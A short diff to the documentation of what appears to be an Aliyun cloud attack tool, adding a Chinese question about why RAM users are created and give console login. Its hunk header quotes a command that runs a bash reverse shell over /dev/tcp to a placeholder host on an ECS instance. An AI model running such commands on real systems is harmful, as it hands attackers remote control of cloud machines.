@@ -58,6 +58,8 @@ python3 main.py -aliyun ecs exec i-2556rj "bash -c 'exec bash -i &>/dev/tcp/ip/p
 
 ## RAM
 
+为什么要创建RAM？为什么常见RAM之后，就可以通过账号登录到阿里云控制台
+
 ### 创建RAM用户
 
 ```bash
